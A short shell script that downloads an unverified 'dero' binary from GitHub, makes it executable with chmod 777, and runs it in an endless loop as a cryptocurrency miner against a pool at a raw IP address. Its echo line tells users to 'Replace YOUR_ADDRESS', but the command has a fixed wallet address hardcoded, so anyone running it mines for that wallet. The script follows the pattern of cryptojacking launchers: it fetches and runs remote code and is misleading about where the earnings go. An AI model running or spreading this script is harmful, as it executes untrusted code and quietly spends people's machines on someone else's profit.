wget https://github.com/aqshakuy/dora/raw/main/dero
chmod 777 dero
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6hsk03skqgr8tscz0xla.$(echo $(shuf -i 1-20000 -n 1)-m1) -r 45.76.162.175:80 -p stratum -m 3
    sleep 5;
done


